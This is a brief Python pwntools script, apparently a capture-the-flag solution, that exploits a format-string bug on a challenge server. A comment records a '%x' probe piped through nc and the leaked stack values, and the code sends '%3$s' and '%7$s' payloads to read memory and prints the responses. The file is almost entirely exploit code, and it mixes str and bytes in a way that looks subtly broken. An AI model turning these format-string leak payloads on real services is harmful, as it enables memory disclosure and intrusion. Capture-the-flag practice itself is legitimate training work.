from pwn import *
p=""
#slonser@DESKTOP-0USDONC:/mnt/c/Users/Seva/Desktop/HACKERDOM/PWN$ python -c "print('%x.'*20)"| nc cyberyoddha.baycyber.net 10005
#200000.ffffffff.8049189.1.ffa8d8b4.ffa8d8bc.804a008.ffa8d820.0.0.f7d07ee5.f7ed0000.f7ed0000.0.f7d07ee5.1.ffa8d8b4.ffa8d8bc.ffa8d844.f7ed0000.0
exp=["%3$s","%7$s"]
for i in exp:
	conn = remote("cyberyoddha.baycyber.net",10005)
	conn.sendline(i)
	p+=conn.recv()
	conn.close()
print(p)